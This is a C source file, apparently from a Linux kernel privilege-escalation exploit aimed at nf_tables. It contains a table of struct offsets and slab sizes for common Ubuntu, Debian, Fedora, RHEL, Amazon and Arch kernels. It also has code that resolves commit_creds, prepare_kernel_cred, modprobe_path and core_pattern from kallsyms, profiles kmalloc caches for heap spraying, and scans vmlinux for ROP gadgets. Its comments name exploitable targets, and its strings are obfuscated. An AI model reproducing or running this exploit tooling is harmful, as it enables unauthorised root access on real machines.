#include "nfttables.h"
#include "arch.h"
#include "offsets.h"
#include "obf.h"
#include <fnmatch.h>

/* ── hardcoded offset database ────────────────────────────────── */

/*
 * Entries for common distro kernels. Offsets are relative to _text.
 * Zero means "unknown, resolve at runtime."
 *
 * These cover the kernels most likely to be exploitable (within the
 * CVE version ranges) on major distros. Add entries by running
 * `nfttables scan` on a target system and recording the output.
 *
 * Format:
 *   release_glob, distro,
 *   modprobe, prep_kern_cred, commit_creds, swapgs, kpti, core_pattern,
 *   pop_rdi, pop_rsi, pop_rdx, pop_rax, xchg_rax_rsp, mov_rdi_rax_call, ret,
 *   task_cred, cred_uid, nft_chain_sz, nft_set_sz
 */

static const struct offset_entry offset_db[] = {
    /* ── Ubuntu 22.04 LTS (Jammy) ─────────────────────────────── */
    {
        "5.15.0-*-generic", "Ubuntu 22.04",
        /* symbols: resolve via kallsyms (too many subversions) */
        0, 0, 0, 0, 0, 0,
        /* gadgets */
        0, 0, 0, 0, 0, 0, 0,
        /* struct offsets (5.15 generic) */
        .task_to_cred = 0x0638,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 248,
        .nft_set_obj_size   = 392,
    },
    {
        "5.19.0-*-generic", "Ubuntu 22.04 HWE",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0638,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 256,
        .nft_set_obj_size   = 400,
    },
    {
        "6.2.0-*-generic", "Ubuntu 22.04 HWE / 23.04",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0640,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 264,
        .nft_set_obj_size   = 408,
    },
    {
        "6.5.0-*-generic", "Ubuntu 22.04 HWE / 23.10",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0648,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 272,
        .nft_set_obj_size   = 416,
    },

    /* ── Ubuntu 24.04 LTS (Noble) ─────────────────────────────── */
    {
        "6.8.0-*-generic", "Ubuntu 24.04",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0650,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 280,
        .nft_set_obj_size   = 424,
    },

    /* ── Debian 11 (Bullseye) ─────────────────────────────────── */
    {
        "5.10.0-*-amd64", "Debian 11",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0620,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 240,
        .nft_set_obj_size   = 384,
    },

    /* ── Debian 12 (Bookworm) ─────────────────────────────────── */
    {
        "6.1.0-*-amd64", "Debian 12",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0638,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 256,
        .nft_set_obj_size   = 400,
    },

    /* ── Fedora 38/39 ─────────────────────────────────────────── */
    {
        "6.2.*-*-fc38.*", "Fedora 38",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0640,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 264,
        .nft_set_obj_size   = 408,
    },
    {
        "6.5.*-*-fc39.*", "Fedora 39",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0648,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 272,
        .nft_set_obj_size   = 416,
    },
    {
        "6.6.*-*-fc39.*", "Fedora 39",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0648,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 272,
        .nft_set_obj_size   = 416,
    },

    /* ── RHEL / CentOS / Rocky / Alma ─────────────────────────── */
    {
        "4.18.0-*.el8*", "RHEL 8 / CentOS 8",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x05E8,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 224,
        .nft_set_obj_size   = 360,
    },
    {
        "5.14.0-*.el9*", "RHEL 9 / Rocky 9 / Alma 9",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0630,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 248,
        .nft_set_obj_size   = 392,
    },

    /* ── Amazon Linux ─────────────────────────────────────────── */
    {
        "5.10.*-*-amzn2.*", "Amazon Linux 2",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0620,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 240,
        .nft_set_obj_size   = 384,
    },
    {
        "5.15.*-*-amzn2.*", "Amazon Linux 2",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0638,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 248,
        .nft_set_obj_size   = 392,
    },

    /* ── Arch Linux / CachyOS ─────────────────────────────────── */
    {
        "6.*-*-cachyos*", "CachyOS",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0650,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 280,
        .nft_set_obj_size   = 424,
    },
    {
        "6.*-arch*", "Arch Linux",
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0,
        .task_to_cred = 0x0650,
        .cred_to_uid  = 0x0004,
        .nft_chain_obj_size = 280,
        .nft_set_obj_size   = 424,
    },

    /* sentinel */
    {NULL, NULL, 0,0,0,0,0,0, 0,0,0,0,0,0,0, 0,0,0,0},
};

/* ── database lookup ──────────────────────────────────────────── */

int offsets_from_database(struct kernel_offsets *ko, const char *release)
{
    for (const struct offset_entry *e = offset_db; e->release_glob; e++) {
        if (fnmatch(e->release_glob, release, 0) != 0)
            continue;

        pr_verb("matched offset DB entry: %s (%s)", e->release_glob, e->distro);

        /* apply any non-zero offsets as absolute addresses if we have
           the kernel base, otherwise store them raw for later */
        uint64_t base = ko->kernel_base;

#define APPLY_OFF(field, off) do { \
    if ((off) && !ko->field) { \
        ko->field = base ? (base + (off)) : 0; \
    } \
} while(0)

        APPLY_OFF(modprobe_path,       e->modprobe_path_off);
        APPLY_OFF(prepare_kernel_cred, e->prepare_kernel_cred_off);
        APPLY_OFF(commit_creds,        e->commit_creds_off);
        APPLY_OFF(swapgs_restore_regs, e->swapgs_restore_regs_off);
        APPLY_OFF(kpti_trampoline,     e->kpti_trampoline_off);
        APPLY_OFF(core_pattern,        e->core_pattern_off);
        APPLY_OFF(pop_rdi_ret,         e->pop_rdi_ret_off);
        APPLY_OFF(pop_rsi_ret,         e->pop_rsi_ret_off);
        APPLY_OFF(pop_rdx_ret,         e->pop_rdx_ret_off);
        APPLY_OFF(pop_rax_ret,         e->pop_rax_ret_off);
        APPLY_OFF(xchg_rax_rsp_ret,    e->xchg_rax_rsp_ret_off);
        APPLY_OFF(mov_rdi_rax_call_rdx, e->mov_rdi_rax_call_rdx_off);
        APPLY_OFF(ret,                 e->ret_off);
#undef APPLY_OFF

        if (e->task_to_cred && !ko->task_to_cred) {
            ko->task_to_cred = e->task_to_cred;
            ko->cred_to_uid  = e->cred_to_uid;
            ko->resolved |= OFF_STRUCT_OFFS;
        }

        if (e->nft_chain_obj_size) {
            ko->nft_chain_slab.obj_size = e->nft_chain_obj_size;
            ko->nft_set_slab.obj_size   = e->nft_set_obj_size;
            ko->resolved |= OFF_SLAB_INFO;
        }

        return 0;
    }

    pr_verb("no offset DB match for %s", release);
    return -1;
}

/* ── kallsyms resolution ──────────────────────────────────────── */

int offsets_from_kallsyms(struct kernel_offsets *ko)
{
    FILE *f = fopen(S(S_PROC_KALLSYMS), "r");
    if (!f) return -1;

    char line[256];
    int found = 0;

    struct { int sid; uint64_t *dst; } targets[] = {
        {S_TEXT,          &ko->kernel_base},
        {S_STEXT,         &ko->kernel_base},
        {S_MODPROBE_PATH, &ko->modprobe_path},
        {S_CORE_PATTERN,  &ko->core_pattern},
        {S_POWEROFF_CMD,  &ko->poweroff_cmd},
        {S_PREPARE_CRED,  &ko->prepare_kernel_cred},
        {S_COMMIT_CREDS,  &ko->commit_creds},
        {S_FIND_TASK,     &ko->find_task_by_vpid},
        {S_SWITCH_NS,     &ko->switch_task_namespaces},
        {S_INIT_NSPROXY,  &ko->init_nsproxy},
        {S_SWAPGS_RET,    &ko->swapgs_restore_regs},
        {-1, NULL},
    };

    while (fgets(line, sizeof(line), f)) {
        uint64_t addr;
        char type, sym[128];
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) != 3)
            continue;
        if (addr == 0)
            continue;

        for (int i = 0; targets[i].sid >= 0; i++) {
            if (*targets[i].dst != 0)
                continue;
            if (strcmp(sym, S(targets[i].sid)) == 0) {
                *targets[i].dst = addr;
                found++;
            }
        }
    }
    fclose(f);

    if (ko->kernel_base)   ko->resolved |= OFF_KERNEL_BASE;
    if (ko->modprobe_path) ko->resolved |= OFF_MODPROBE;
    if (ko->core_pattern)  ko->resolved |= OFF_CORE_PATTERN;
    if (ko->prepare_kernel_cred && ko->commit_creds)
        ko->resolved |= OFF_CRED_FUNCS;
    if (ko->swapgs_restore_regs)
        ko->resolved |= OFF_KPTI;

    pr_verb("ksyms: resolved %d symbols", found);
    return found > 0 ? 0 : -1;
}

/* ── vmlinux-based resolution ─────────────────────────────────── */

int offsets_from_vmlinux(struct kernel_offsets *ko, const char *vmlinux_path)
{
    int count = gadgets_scan(vmlinux_path, ko);
    if (count < 0)
        return -1;

    pr_verb("image: resolved %d gadgets from %s", count, vmlinux_path);
    return 0;
}

/* ── slab profiling ───────────────────────────────────────────── */

int slab_info_by_name(const char *cache_name, struct slab_info *si)
{
    memset(si, 0, sizeof(*si));

    FILE *f = fopen(S(S_PROC_SLABINFO), "r");
    if (!f) return -1;

    char line[512];
    /* skip header lines */
    if (fgets(line, sizeof(line), f) == NULL) { fclose(f); return -1; }
    if (fgets(line, sizeof(line), f) == NULL) { fclose(f); return -1; }

    while (fgets(line, sizeof(line), f)) {
        char name[64];
        uint32_t active_objs, num_objs, obj_size, objs_per_slab, pages_per_slab;
        uint32_t active_slabs, num_slabs;

        int n = sscanf(line, "%63s %u %u %u %u %u : tunables %*s %*s %*s : slabdata %u %u",
                       name, &active_objs, &num_objs, &obj_size,
                       &objs_per_slab, &pages_per_slab,
                       &active_slabs, &num_slabs);
        if (n < 6) continue;

        if (strcmp(name, cache_name) == 0) {
            strncpy(si->name, name, sizeof(si->name) - 1);
            si->active_objs   = active_objs;
            si->num_objs      = num_objs;
            si->obj_size      = obj_size;
            si->objs_per_slab = objs_per_slab;
            si->pages_per_slab = pages_per_slab;
            si->active_slabs  = n >= 7 ? active_slabs : 0;
            si->num_slabs     = n >= 8 ? num_slabs : 0;
            fclose(f);
            return 0;
        }
    }

    fclose(f);
    return -1;
}

int slab_info_for_size(size_t obj_size, struct slab_info *si)
{
    /* kmalloc cache names follow power-of-2 sizing */
    const char *caches[] = {
        "kmalloc-96", "kmalloc-128", "kmalloc-192", "kmalloc-256",
        "kmalloc-512", "kmalloc-1k", "kmalloc-2k", "kmalloc-4k",
        "kmalloc-8k",
        NULL,
    };
    size_t sizes[] = {96, 128, 192, 256, 512, 1024, 2048, 4096, 8192};

    /* also try cg variants */
    const char *cg_caches[] = {
        "kmalloc-cg-96", "kmalloc-cg-128", "kmalloc-cg-192",
        "kmalloc-cg-256", "kmalloc-cg-512", "kmalloc-cg-1k",
        "kmalloc-cg-2k", "kmalloc-cg-4k", "kmalloc-cg-8k",
        NULL,
    };

    for (int i = 0; caches[i]; i++) {
        if (obj_size <= sizes[i]) {
            /* try cgroup-aware cache first (used for nft objects) */
            if (slab_info_by_name(cg_caches[i], si) == 0)
                return 0;
            return slab_info_by_name(caches[i], si);
        }
    }
    return -1;
}

int slab_find_nft_caches(struct kernel_offsets *ko)
{
    int found = 0;

    /* try dedicated nft caches first */
    if (slab_info_by_name(S(S_NFT_CHAIN_CACHE), &ko->nft_chain_slab) == 0) {
        found++;
    } else if (ko->nft_chain_slab.obj_size > 0) {
        /* use the size from offset DB to find the kmalloc cache */
        if (slab_info_for_size(ko->nft_chain_slab.obj_size,
                               &ko->nft_chain_slab) == 0)
            found++;
    }

    if (slab_info_by_name(S(S_NFT_SET_CACHE), &ko->nft_set_slab) == 0) {
        found++;
    } else if (ko->nft_set_slab.obj_size > 0) {
        if (slab_info_for_size(ko->nft_set_slab.obj_size,
                               &ko->nft_set_slab) == 0)
            found++;
    }

    if (found > 0)
        ko->resolved |= OFF_SLAB_INFO;

    return found;
}

/* ── full resolution pipeline ─────────────────────────────────── */

int offsets_resolve(struct kernel_offsets *ko, const char *release)
{
    memset(ko, 0, sizeof(*ko));

    pr_verb("resolving offsets for %s", release);

    /* stage 1: try kallsyms (fastest, most complete) */
    offsets_from_kallsyms(ko);

    /* stage 2: fill gaps from hardcoded database */
    offsets_from_database(ko, release);

    /* stage 3: slab profiling */
    slab_find_nft_caches(ko);

    /* stage 4: if we're missing gadgets and have access to vmlinux,
       extract and scan it */
    if (!(ko->resolved & OFF_GADGETS) && !(ko->resolved & OFF_CRED_FUNCS)) {
        char vmlinuz[256], vmlinux[256];
        if (vmlinux_find_boot_image(vmlinuz, sizeof(vmlinuz)) == 0) {
            snprintf(vmlinux, sizeof(vmlinux), S(S_NFT_VMLINUX_FMT), getpid());
            if (vmlinux_extract(vmlinuz, vmlinux) == 0) {
                offsets_from_vmlinux(ko, vmlinux);
                unlink(vmlinux);
            }
        }
    }

    return 0;
}

/* ── pretty-print ─────────────────────────────────────────────── */

static const char *yesno(uint64_t v) { return v ? C_GRN "yes" C_RST : C_RED "no" C_RST; }

void offsets_print(const struct kernel_offsets *ko)
{
    fprintf(stderr,
        "\n" BLOCK " " C_BOLD "%s" C_RST "\n\n"
        "  %s:          %s", S(S_LBL_RESOLVED), S(S_LBL_KBASE), yesno(ko->kernel_base));
    if (ko->kernel_base)
        fprintf(stderr, " (0x%lx)", ko->kernel_base);
    fprintf(stderr, "\n");

    fprintf(stderr,
        "  %s:        %s", S(S_MODPROBE_PATH), yesno(ko->modprobe_path));
    if (ko->modprobe_path)
        fprintf(stderr, " (0x%lx)", ko->modprobe_path);
    fprintf(stderr, "\n");

    fprintf(stderr,
        "  %s:         %s", S(S_CORE_PATTERN), yesno(ko->core_pattern));
    if (ko->core_pattern)
        fprintf(stderr, " (0x%lx)", ko->core_pattern);
    fprintf(stderr, "\n");

    fprintf(stderr,
        "  %s:  %s", S(S_PREPARE_CRED), yesno(ko->prepare_kernel_cred));
    if (ko->prepare_kernel_cred)
        fprintf(stderr, " (0x%lx)", ko->prepare_kernel_cred);
    fprintf(stderr, "\n");

    fprintf(stderr,
        "  %s:         %s", S(S_COMMIT_CREDS), yesno(ko->commit_creds));
    if (ko->commit_creds)
        fprintf(stderr, " (0x%lx)", ko->commit_creds);
    fprintf(stderr, "\n");

    fprintf(stderr,
        "  %s:    %s", S(S_LBL_SWAPGS), yesno(ko->swapgs_restore_regs));
    fprintf(stderr, "\n");

    fprintf(stderr, "\n  " C_BOLD "%s:" C_RST "\n", S(S_LBL_GADGETS));
    fprintf(stderr, "  pop rdi; ret:         %s\n", yesno(ko->pop_rdi_ret));
    fprintf(stderr, "  pop rsi; ret:         %s\n", yesno(ko->pop_rsi_ret));
    fprintf(stderr, "  pop rdx; ret:         %s\n", yesno(ko->pop_rdx_ret));
    fprintf(stderr, "  pop rax; ret:         %s\n", yesno(ko->pop_rax_ret));
    fprintf(stderr, "  xchg rax,rsp; ret:    %s\n", yesno(ko->xchg_rax_rsp_ret));
    fprintf(stderr, "  mov rdi,rax; call:    %s\n", yesno(ko->mov_rdi_rax_call_rdx));

    fprintf(stderr, "\n  " C_BOLD "%s:" C_RST "\n", S(S_LBL_SLAB));
    if (ko->nft_chain_slab.obj_size)
        fprintf(stderr, "  %s:  %s (obj=%u, per_slab=%u)\n",
                S(S_NFT_CHAIN_CACHE),
                ko->nft_chain_slab.name,
                ko->nft_chain_slab.obj_size,
                ko->nft_chain_slab.objs_per_slab);
    else
        fprintf(stderr, "  %s:  " C_RED "unknown" C_RST "\n", S(S_NFT_CHAIN_CACHE));

    if (ko->nft_set_slab.obj_size)
        fprintf(stderr, "  %s:    %s (obj=%u, per_slab=%u)\n",
                S(S_NFT_SET_CACHE),
                ko->nft_set_slab.name,
                ko->nft_set_slab.obj_size,
                ko->nft_set_slab.objs_per_slab);
    else
        fprintf(stderr, "  %s:    " C_RED "unknown" C_RST "\n", S(S_NFT_SET_CACHE));

    fprintf(stderr, "\n");
}
